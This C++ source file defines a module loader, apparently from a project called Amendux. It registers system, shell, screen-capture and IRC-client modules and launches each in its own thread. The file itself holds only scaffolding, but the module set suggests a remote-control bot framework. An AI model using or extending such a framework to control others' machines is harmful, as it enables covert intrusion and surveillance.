#include "stdafx.h"
#include "Log.h"
#include "Config.h"
#include "Shell.h"
#include "Screen.h"
#include "IRCClient.h"
#include "System.h"
#include "Thread.h"
#include "ModuleLoader.h"

using namespace Amendux;

ModuleLoader *ModuleLoader::s_ModuleLoader = nullptr;

ModuleLoader::ModuleLoader()
{
	LogInfo(L"ModuleLoader", L"Initialize module loader class");
}


ModuleLoader::~ModuleLoader()
{
	LogInfo(L"ModuleLoader", L"Terminate module loader class");
}


bool ModuleLoader::RunModule(const std::wstring& modName, std::map<std::wstring, std::wstring> params) {
	Module *mod = (Module *)moduleList[modName];
	if (mod) {
		LogInfo(L"ModuleLoader", L"Spawn module " + modName + L" with " + std::to_wstring(params.size()) + L" parameters");

		mod->PushParameters(params);
		Thread<Module> *thread = new Thread<Module>(mod, &Module::Run);
		if (!thread->Start()) {
			LogError(L"ModuleLoader", L"Cannot spawn module " + modName);

			return false;
		}

		return true;
	}

	return false;
}


void ModuleLoader::InitClass()
{
	if (!Config::Current()->CanRunModules()) {
		return;
	}

	// Register modules
#ifdef MODSYSTEM_ENABLED
		RegisterModule(L"system", new System(this));
#endif

#ifdef MODSHELL_ENABLED
	RegisterModule(L"shell", new Shell(this));
#endif

#ifdef MODSCREEN_ENABLED
	RegisterModule(L"screen", new Screen(this));
#endif

#ifdef MODIRC_ENABLED
	RegisterModule(L"ircclient", new IRCClient(this));
#endif
}
